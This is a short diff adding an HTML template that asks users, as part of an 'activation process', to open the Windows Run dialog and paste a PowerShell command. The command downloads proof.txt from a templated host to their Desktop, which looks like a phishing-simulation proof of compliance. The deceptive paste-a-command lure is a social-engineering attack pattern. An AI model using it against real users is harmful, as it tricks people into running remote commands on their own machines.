@@ -1,0 +1,15 @@
+<div class="space-y-4">
+  <p class="text-sm text-text-200 leading-relaxed">
+    To complete the activation process, please run the following command on your computer:
+  </p>
+  
+  <div class="bg-[#1a1a1a] rounded-lg p-4 font-mono text-sm">
+    <code class="text-emerald-400 break-all">
+      powershell -Command "Invoke-WebRequest -Uri 'http://{{domain}}:{{port}}/dav/proof.txt' -OutFile \"$env:USERPROFILE\Desktop\proof.txt\""
+    </code>
+  </div>
+  
+  <p class="text-xs text-text-300">
+    Press <kbd class="px-1.5 py-0.5 bg-bg-300 rounded text-text-100 font-medium">Win</kbd> + <kbd class="px-1.5 py-0.5 bg-bg-300 rounded text-text-100 font-medium">R</kbd> to open Run dialog, then paste the command above.
+  </p>
+</div>
